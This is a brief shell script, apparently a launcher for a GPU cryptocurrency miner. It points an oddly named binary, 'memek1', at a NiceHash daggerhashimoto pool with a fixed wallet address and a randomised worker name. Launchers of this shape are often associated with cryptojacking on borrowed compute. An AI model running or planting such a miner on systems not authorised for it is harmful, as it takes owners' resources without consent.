POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353

WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk

WORKER=$(echo $(shuf -i 1-10 -n 1)-GPU)

chmod +x memek1

./memek1 -pool $POOL -wal $WALLET.$WORKER -pass x -proto 4 -stales 0
